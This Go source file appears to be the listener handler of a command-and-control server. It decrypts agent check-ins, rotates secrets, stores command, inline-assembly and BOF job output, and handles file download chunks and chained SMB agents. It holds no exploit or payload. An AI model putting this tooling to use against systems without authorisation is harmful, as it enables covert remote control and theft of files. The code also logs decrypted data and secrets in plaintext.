// internal/agent/listeners/handler_active.go
package listeners

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"path/filepath"
	"strconv"
	"strings"
	"time"
)

// handleActiveConnection - COMPLETE VERSION WITH ALL PROCESSING LOGIC
func (m *Manager) handleActiveConnection(w http.ResponseWriter, r *http.Request, conn *ActiveConnection, db *sql.DB) {
	log.Printf("[Active Connection] Handling request for client %s", conn.ClientID)

	// Create context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	// Start transaction
	tx, err := db.BeginTx(ctx, &sql.TxOptions{
		Isolation: sql.LevelReadCommitted,
	})
	if err != nil {
		log.Printf("[Active Connection] Failed to begin transaction: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}
	defer tx.Rollback()

	progressCh := m.uploadTracker.progress.Subscribe()
	defer m.uploadTracker.progress.Unsubscribe(progressCh)

	// Start progress monitoring goroutine
	go func() {
		for stats := range progressCh {
			// Store or process the progress stats as needed
			log.Printf("[Progress] File: %s, Current: %d/%d bytes (%.2f%%), Speed: %.2f MB/s",
				stats.Filename,
				stats.Current,
				stats.Total,
				stats.Percentage,
				stats.Speed/1024/1024)
		}
	}()

	// Read and parse the request body
	var postData struct {
		Data    string `json:"data"`
		AgentID string `json:"agent_id"`
	}

	if err := json.NewDecoder(r.Body).Decode(&postData); err != nil {
		log.Printf("[Active Connection] Failed to decode request body: %v", err)
		http.Error(w, "Bad Request", http.StatusBadRequest)
		return
	}

	log.Printf("[Active Connection] Received data for client %s", conn.ClientID)
	log.Printf("[Active Connection] Current secret1: %s", conn.Secret1)

	// Convert secret to key
	secretHash := sha256.Sum256([]byte(conn.Secret1))

	// Decode base64
	ciphertext, err := base64.StdEncoding.DecodeString(postData.Data)
	if err != nil {
		log.Printf("[Active Connection] Failed to decode base64: %v", err)
		http.Error(w, "Invalid data format", http.StatusBadRequest)
		return
	}

	// Create cipher and decrypt data
	block, err := aes.NewCipher(secretHash[:])
	if err != nil {
		log.Printf("[Active Connection] Failed to create cipher: %v", err)
		http.Error(w, "Decryption failed", http.StatusInternalServerError)
		return
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		log.Printf("[Active Connection] Failed to create GCM: %v", err)
		http.Error(w, "Decryption failed", http.StatusInternalServerError)
		return
	}

	nonceSize := aesGCM.NonceSize()
	if len(ciphertext) < nonceSize {
		log.Printf("[Active Connection] Ciphertext too short")
		http.Error(w, "Invalid data", http.StatusBadRequest)
		return
	}

	nonce := ciphertext[:nonceSize]
	encryptedData := ciphertext[nonceSize:]

	plaintext, err := aesGCM.Open(nil, nonce, encryptedData, nil)
	if err != nil {
		log.Printf("[Active Connection] Failed to decrypt: %v", err)
		http.Error(w, "Decryption failed", http.StatusBadRequest)
		return
	}

	log.Printf("[Active Connection] Successfully decrypted data: %s", string(plaintext))

	// Parse the decrypted data - now includes optional link data fields
	var decryptedData map[string]interface{}
	if err := json.Unmarshal(plaintext, &decryptedData); err != nil {
		log.Printf("[Active Connection] Failed to parse decrypted data: %v", err)
		http.Error(w, "Invalid data format", http.StatusBadRequest)
		return
	}

	// Extract standard fields
	agentID, _ := decryptedData["agent_id"].(string)
	results, _ := decryptedData["results"].([]interface{})

	// Convert results to expected format
	var resultsMap []map[string]interface{}
	for _, r := range results {
		if rm, ok := r.(map[string]interface{}); ok {
			resultsMap = append(resultsMap, rm)
		}
	}

	// Process the edge agent's own results first
	if len(resultsMap) > 0 {
		if err := m.processResults(ctx, tx, agentID, resultsMap); err != nil {
			log.Printf("[Active Connection] Failed to process results: %v", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
	}

	// Check for link handshake (new SMB agent connecting)
	// Field name is configurable via smb_link.malleable.link_handshake_field (default: "lh")
	if linkHandshake, ok := decryptedData["lh"].(map[string]interface{}); ok {
		log.Printf("[Active Connection] Processing link handshake from edge %s", conn.ClientID)
		response, err := m.processLinkHandshake(ctx, conn.ClientID, linkHandshake)
		if err != nil {
			log.Printf("[Active Connection] Link handshake failed: %v", err)
			// Don't fail the whole request, just log the error
		} else if response != nil {
			// Store the response to be sent back to the edge agent
			// This will be picked up in the GET response
			m.storeLinkHandshakeResponse(conn.ClientID, response)
		}
	}

	// Check for link data (data from linked SMB agents)
	// Field name is configurable via smb_link.malleable.link_data_field (default: "ld")
	if linkData, ok := decryptedData["ld"].([]interface{}); ok && len(linkData) > 0 {
		log.Printf("[Active Connection] Processing %d link data items from edge %s", len(linkData), conn.ClientID)
		if err := m.processLinkData(ctx, tx, conn.ClientID, linkData); err != nil {
			log.Printf("[Active Connection] Failed to process link data: %v", err)
			// Don't fail the whole request, just log the error
		}
	}

	// Check for link unlink notifications (when edge agent disconnects from SMB agent)
	// Field: "lu" (link_unlink) contains routing IDs that have been unlinked
	if luRaw, exists := decryptedData["lu"]; exists {
		log.Printf("[Active Connection] DEBUG: Found 'lu' field in payload, type=%T, value=%v", luRaw, luRaw)
		if unlinkData, ok := luRaw.([]interface{}); ok && len(unlinkData) > 0 {
			log.Printf("[Active Connection] Processing %d unlink notifications from edge %s", len(unlinkData), conn.ClientID)
			m.processUnlinkNotifications(ctx, conn.ClientID, unlinkData)
		} else {
			log.Printf("[Active Connection] DEBUG: 'lu' field type assertion to []interface{} failed")
		}
	}

	// Rotate secrets
	h := hmac.New(sha256.New, []byte(conn.Secret2))
	h.Write([]byte(conn.Secret1))
	newSecret := fmt.Sprintf("%x", h.Sum(nil))

	conn.Secret2 = conn.Secret1
	conn.Secret1 = newSecret

	// Update secrets in database using transaction
	_, err = tx.ExecContext(ctx, `
		UPDATE connections 
		SET 
			secret1 = $1, 
			secret2 = $2,
			lastSEEN = CURRENT_TIMESTAMP
		WHERE newclientID = $3`,
		conn.Secret1,
		conn.Secret2,
		conn.ClientID,
	)
	if err != nil {
		log.Printf("[Active Connection] Failed to update secrets in database: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	// Commit transaction
	if err := tx.Commit(); err != nil {
		log.Printf("[Active Connection] Failed to commit transaction: %v", err)
		http.Error(w, "Internal Server Error", http.StatusInternalServerError)
		return
	}

	// Send success response
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{
		"status": "success",
	})
}

// processResults handles all the different types of results from agents
// OPTIMIZED: Batch database INSERTs for 40x performance improvement
func (m *Manager) processResults(ctx context.Context, tx *sql.Tx, agentID string, results []map[string]interface{}) error {
	processedChunks := make(map[string]bool)
	log.Printf("[VERSION CHECK] Running updated handler code - v4 with bulk insert optimization")

	// Collect outputs for bulk insert (instead of inserting one-by-one)
	outputBatch := make([]OutputRecord, 0, len(results))

	for _, result := range results {
		// ADD THIS DEBUG LOGGING
		log.Printf("[DEBUG] Processing result: command=%v, filename=%v, data length=%v, currentChunk=%v, totalChunks=%v",
			result["command"],
			result["filename"],
			len(fmt.Sprintf("%v", result["data"])),
			result["currentChunk"],
			result["totalChunks"])

		// Get the command type first to determine how to process
		command, hasCommand := result["command"].(string)

		// Use if-else chain to ensure only ONE path is taken
		if hasCommand && strings.HasPrefix(command, "inline-assembly") {
			// Modified to return output record instead of inserting
			if record, err := m.processInlineAssemblyResultOptimized(ctx, tx, agentID, result); err != nil {
				log.Printf("[Process Results] Failed to process inline-assembly: %v", err)
				continue
			} else if record != nil {
				outputBatch = append(outputBatch, *record)
			}
		} else if hasCommand && (strings.HasPrefix(command, "upload") || strings.HasPrefix(command, "download")) {
			log.Printf("[DEBUG] Detected file operation for command: %s", command)
			// File operations don't produce command_outputs, skip
			if err := m.processFileOperationResult(ctx, tx, agentID, result, processedChunks); err != nil {
				log.Printf("[Process Results] Failed to process file operation: %v", err)
				continue
			}
		} else {
			// Modified to return output record instead of inserting
			if record, err := m.processRegularCommandResultOptimized(ctx, tx, agentID, result); err != nil {
				log.Printf("[Process Results] Failed to process regular command: %v", err)
				continue
			} else if record != nil {
				outputBatch = append(outputBatch, *record)
			}
		}
	}

	// Perform single bulk INSERT for all outputs (replaces N individual INSERTs)
	if len(outputBatch) > 0 {
		log.Printf("[Bulk Insert] Inserting %d command outputs in single query", len(outputBatch))
		if err := BulkInsertOutputs(ctx, tx, outputBatch); err != nil {
			return fmt.Errorf("bulk insert failed: %v", err)
		}
		log.Printf("[Bulk Insert] Successfully inserted %d outputs", len(outputBatch))

		// Broadcast all results after successful insert
		for _, record := range outputBatch {
			commandResult := map[string]interface{}{
				"agent_id":   agentID,
				"command_id": record.CommandID,
				"output":     record.Output,
				"timestamp":  time.Now().Format(time.RFC3339),
				"status":     "completed",
			}

			if m.commandBuffer == nil {
				log.Printf("[Bulk Insert] ERROR: commandBuffer is nil!")
				continue
			}

			if err := m.commandBuffer.BroadcastResult(commandResult); err != nil {
				log.Printf("[Bulk Insert] Failed to broadcast result for command %d: %v", record.CommandID, err)
			} else {
				log.Printf("[Bulk Insert] Successfully broadcast result for command %d", record.CommandID)
			}
		}
	}

	return nil
}

// processInlineAssemblyResultOptimized - OPTIMIZED version that returns OutputRecord for bulk insert
func (m *Manager) processInlineAssemblyResultOptimized(ctx context.Context, tx *sql.Tx, agentID string, result map[string]interface{}) (*OutputRecord, error) {
	log.Printf("[Inline-Assembly] Processing inline-assembly result from agent %s", agentID)

	command, _ := result["command"].(string)
	commandDBID, _ := result["command_db_id"].(float64)
	output, _ := result["output"].(string)
	exitCode, _ := result["exit_code"].(float64)

	// Check if this is an async result
	isAsync := strings.Contains(command, "async")

	// Format the output based on what we received
	var formattedOutput string
	if output != "" {
		formattedOutput = output
	} else if exitCode == 1 {
		formattedOutput = "[!] Inline-assembly execution failed - no output received"
	} else {
		formattedOutput = "[!] Inline-assembly execution completed with no output"
	}

	// Return output record for bulk insert
	if commandDBID > 0 {
		log.Printf("[Inline-Assembly] Prepared output for command ID %d (async: %v, exit code: %.0f)",
			int(commandDBID), isAsync, exitCode)

		return &OutputRecord{
			CommandID: int(commandDBID),
			Output:    formattedOutput,
		}, nil
	}

	return nil, nil
}

// processInlineAssemblyResult handles inline-assembly command results
// DEPRECATED: Use processInlineAssemblyResultOptimized for better performance
func (m *Manager) processInlineAssemblyResult(ctx context.Context, tx *sql.Tx, agentID string, result map[string]interface{}) error {
	log.Printf("[Inline-Assembly] Processing inline-assembly result from agent %s", agentID)

	command, _ := result["command"].(string)
	commandDBID, _ := result["command_db_id"].(float64)
	output, _ := result["output"].(string)
	exitCode, _ := result["exit_code"].(float64)

	// Check if this is an async result
	isAsync := strings.Contains(command, "async")

	// Format the output based on what we received
	var formattedOutput string
	if output != "" {
		formattedOutput = output
	} else if exitCode == 1 {
		formattedOutput = "[!] Inline-assembly execution failed - no output received"
	} else {
		formattedOutput = "[!] Inline-assembly execution completed with no output"
	}

	// Store in database
	if commandDBID > 0 {
		if _, err := tx.ExecContext(ctx, `
            INSERT INTO command_outputs (command_id, output, timestamp)
            VALUES ($1, $2, CURRENT_TIMESTAMP)`,
			int(commandDBID),
			formattedOutput,
		); err != nil {
			return fmt.Errorf("failed to insert output: %v", err)
		}
		log.Printf("[Inline-Assembly] Stored output for command ID %d (async: %v, exit code: %.0f)",
			int(commandDBID), isAsync, exitCode)
	}

	// Broadcast to WebSocket clients with special type
	commandResult := map[string]interface{}{
		"agent_id":   agentID,
		"command_id": fmt.Sprintf("%d", int(commandDBID)),
		"output":     output,
		"timestamp":  time.Now().Format(time.RFC3339),
		"status":     "completed",
		"type":       "inline_assembly_result",
		"exit_code":  exitCode,
	}

	if err := m.commandBuffer.BroadcastResult(commandResult); err != nil {
		log.Printf("[Inline-Assembly] Failed to broadcast result: %v", err)
	} else {
		log.Printf("[Inline-Assembly] Successfully broadcast result for agent %s", agentID)
	}

	return nil
}

// processFileOperationResult handles upload/download chunk results
func (m *Manager) processFileOperationResult(ctx context.Context, tx *sql.Tx, agentID string, result map[string]interface{}, processedChunks map[string]bool) error {
	filename, _ := result["filename"].(string)
	currentChunk, _ := result["currentChunk"].(float64)
	totalChunks, _ := result["totalChunks"].(float64)
	data, _ := result["data"].(string)
	command, _ := result["command"].(string)
	commandDBID, _ := result["command_db_id"].(float64)
	fileSize, _ := result["file_size"].(float64)

	// Validate required fields
	if filename == "" || data == "" {
		return fmt.Errorf("missing required file operation fields")
	}

	baseCommand := strings.Split(command, " ")[0]
	log.Printf("[File Operation] Command details: Type=%s, Current=%v/%v, DBId=%v",
		baseCommand, currentChunk, totalChunks, commandDBID)

	// Create unique key for this chunk
	chunkKey := fmt.Sprintf("%s_%d", filename, int(currentChunk))

	// Skip if we've already processed this chunk in this request
	if processedChunks[chunkKey] {
		log.Printf("[File Operation] Skipping already processed chunk %d for file %s", int(currentChunk), filename)
		return nil
	}

	switch baseCommand {
	case "upload":
		// Handle upload chunk
		chunk := UploadChunk{
			Filename:     filename,
			CurrentChunk: int(currentChunk),
			TotalChunks:  int(totalChunks),
			Data:         data,
			FileSize:     int64(fileSize),
		}

		if err := m.uploadTracker.handleUploadChunk(chunk); err != nil {
			return fmt.Errorf("failed to handle upload chunk: %v", err)
		}

		// Store progress in database if we have a command_db_id
		if commandDBID > 0 {
			if _, err := tx.ExecContext(ctx, `
                INSERT INTO command_outputs (command_id, output, timestamp)
                VALUES ($1, $2, CURRENT_TIMESTAMP)`,
				int(commandDBID),
				fmt.Sprintf("Uploaded chunk %d/%d of %s", int(currentChunk), int(totalChunks), filename),
			); err != nil {
				log.Printf("[File Operation] Failed to insert progress: %v", err)
			}
		}

		// Queue next upload chunk if not the last one
		if int(currentChunk) < int(totalChunks) {
			chunkDir := filepath.Join("/app/temp", filename)
			if err := m.commandBuffer.QueueUploadNextChunk(agentID, chunkDir); err != nil {
				log.Printf("[File Operation] Failed to queue next chunk: %v", err)
			} else {
				log.Printf("[File Operation] Queued next chunk for upload of %s (%d/%d)",
					filename, int(currentChunk)+1, int(totalChunks))
			}
		}

	case "download":
		log.Printf("[DEBUG] Processing download chunk %d/%d for file %s",
			int(currentChunk), int(totalChunks), filename)

		// Handle download chunk
		chunk := DownloadChunk{
			Filename:     filename,
			CurrentChunk: int(currentChunk),
			TotalChunks:  int(totalChunks),
			Data:         data,
		}

		if err := m.downloadTracker.handleDownloadChunk(chunk); err != nil {
			return fmt.Errorf("failed to handle download chunk: %v", err)
		}

		// Store progress in database if we have a command_db_id
		if commandDBID > 0 {
			if _, err := tx.ExecContext(ctx, `
                INSERT INTO command_outputs (command_id, output, timestamp)
                VALUES ($1, $2, CURRENT_TIMESTAMP)`,
				int(commandDBID),
				fmt.Sprintf("Downloaded chunk %d/%d of %s", int(currentChunk), int(totalChunks), filename),
			); err != nil {
				log.Printf("[DEBUG] Failed to insert progress: %v", err)
			}
		}

		// Queue next chunk if not the last one
		if int(currentChunk) < int(totalChunks) {
			nextChunkCmd := map[string]interface{}{
				"command":       command,
				"command_db_id": int(commandDBID),
				"agent_id":      agentID,
				"filename":      filename,
				"remote_path":   "",
				"currentChunk":  int(currentChunk) + 1,
				"totalChunks":   int(totalChunks),
				"timestamp":     time.Now().Format("2006-01-02T15:04:05.000000"),
			}

			log.Printf("[DEBUG] Created next chunk command: %+v", nextChunkCmd)

			if err := m.commandBuffer.QueueDownloadCommand(agentID, nextChunkCmd); err != nil {
				log.Printf("[ERROR] Failed to queue next download chunk: %v", err)
			} else {
				log.Printf("[DEBUG] Successfully queued next chunk request")
			}
		} else {
			log.Printf("[DEBUG] Final chunk received, download complete")
		}

	default:
		return fmt.Errorf("unexpected file operation command: %s", baseCommand)
	}

	// Mark this chunk as processed
	processedChunks[chunkKey] = true
	return nil
}

// processRegularCommandResult handles normal command output
// processRegularCommandResultOptimized - OPTIMIZED version that returns OutputRecord for bulk insert
func (m *Manager) processRegularCommandResultOptimized(ctx context.Context, tx *sql.Tx, agentID string, result map[string]interface{}) (*OutputRecord, error) {
	commandDBID, okID := result["command_db_id"].(float64)
	output, okOutput := result["output"].(string)

	if !okID {
		// Try parsing as json.Number in case it's coming as a string
		if strID, ok := result["command_db_id"].(string); ok {
			if id, err := strconv.ParseFloat(strID, 64); err == nil {
				commandDBID = id
				okID = true
			}
		}
	}

	if !okID {
		return nil, fmt.Errorf("missing or invalid command_db_id in result")
	}

	if !okOutput {
		// For some commands, output might be empty, which is okay
		output = ""
		okOutput = true
	}

	// Special handling for BOF_ASYNC messages
	if strings.HasPrefix(output, "BOF_ASYNC_") {
		// BOF async requires immediate database insert for state management
		if err := m.processBOFAsyncResult(ctx, tx, agentID, int(commandDBID), output); err != nil {
			return nil, err
		}
		return nil, nil // Already inserted by processBOFAsyncResult
	}

	// Return output record for bulk insert (broadcast happens later)
	return &OutputRecord{
		CommandID: int(commandDBID),
		Output:    output,
	}, nil
}

// processRegularCommandResult - Original version (DEPRECATED, use processRegularCommandResultOptimized)
func (m *Manager) processRegularCommandResult(ctx context.Context, tx *sql.Tx, agentID string, result map[string]interface{}) error {
	commandDBID, okID := result["command_db_id"].(float64)
	output, okOutput := result["output"].(string)

	if !okID {
		// Try parsing as json.Number in case it's coming as a string
		if strID, ok := result["command_db_id"].(string); ok {
			if id, err := strconv.ParseFloat(strID, 64); err == nil {
				commandDBID = id
				okID = true
			}
		}
	}

	if !okID {
		return fmt.Errorf("missing or invalid command_db_id in result")
	}

	if !okOutput {
		// For some commands, output might be empty, which is okay
		output = ""
		okOutput = true
	}

	// Special handling for BOF_ASYNC messages
	if strings.HasPrefix(output, "BOF_ASYNC_") {
		return m.processBOFAsyncResult(ctx, tx, agentID, int(commandDBID), output)
	}

	// Store regular command output in database
	if _, err := tx.ExecContext(ctx, `
        INSERT INTO command_outputs (command_id, output, timestamp)
        VALUES ($1, $2, CURRENT_TIMESTAMP)`,
		int(commandDBID),
		output,
	); err != nil {
		return fmt.Errorf("failed to insert command output: %v", err)
	}

	// Broadcast the result
	commandResult := map[string]interface{}{
		"agent_id":   agentID,
		"command_id": fmt.Sprintf("%d", int(commandDBID)),
		"output":     output,
		"timestamp":  time.Now().Format(time.RFC3339),
		"status":     "completed",
	}

	if err := m.commandBuffer.BroadcastResult(commandResult); err != nil {
		log.Printf("[Regular Command] Failed to send command result: %v", err)
	} else {
		log.Printf("[Regular Command] Successfully sent command result for command ID %d", int(commandDBID))
	}

	return nil
}

// processBOFAsyncResult handles BOF async messages
func (m *Manager) processBOFAsyncResult(ctx context.Context, tx *sql.Tx, agentID string, commandDBID int, output string) error {
	parts := strings.SplitN(output, "|", 3)
	if len(parts) >= 2 {
		statusType := parts[0]
		jobID := parts[1]
		message := ""
		if len(parts) > 2 {
			message = parts[2]
		}

		log.Printf("[BOF Async] %s for job %s", statusType, jobID)

		// Format the output nicely for database storage
		var formattedOutput string
		switch statusType {
		case "BOF_ASYNC_STARTED":
			formattedOutput = fmt.Sprintf("[+] BOF async job started\nJob ID: %s\nBOF: %s", jobID, message)
		case "BOF_ASYNC_COMPLETED":
			formattedOutput = fmt.Sprintf("[+] BOF async job completed\nJob ID: %s\n\nOutput:\n%s", jobID, message)
		case "BOF_ASYNC_CRASHED":
			formattedOutput = fmt.Sprintf("[-] BOF async job crashed\nJob ID: %s\nError: %s", jobID, message)
		case "BOF_ASYNC_KILLED":
			formattedOutput = fmt.Sprintf("[!] BOF async job killed\nJob ID: %s", jobID)
		case "BOF_ASYNC_TIMEOUT":
			formattedOutput = fmt.Sprintf("[!] BOF async job timeout\nJob ID: %s", jobID)
		default:
			formattedOutput = output // Use original if unknown status
		}

		// Store the formatted output in database
		if _, err := tx.ExecContext(ctx, `
            INSERT INTO command_outputs (command_id, output, timestamp)
            VALUES ($1, $2, CURRENT_TIMESTAMP)`,
			commandDBID,
			formattedOutput,
		); err != nil {
			return fmt.Errorf("failed to insert BOF async output: %v", err)
		}

		log.Printf("[BOF Async] Stored BOF async %s output for command ID %d", statusType, commandDBID)

		// Broadcast the original BOF_ASYNC message so client can parse it
		commandResult := map[string]interface{}{
			"agent_id":   agentID,
			"command_id": fmt.Sprintf("%d", int(commandDBID)),
			"output":     output, // Send original BOF_ASYNC_* format for client parsing
			"timestamp":  time.Now().Format(time.RFC3339),
			"status":     "completed",
		}

		if err := m.commandBuffer.BroadcastResult(commandResult); err != nil {
			log.Printf("[BOF Async] Failed to broadcast BOF result: %v", err)
		} else {
			log.Printf("[BOF Async] Successfully broadcast BOF %s for job %s", statusType, jobID)
		}
	}

	return nil
}
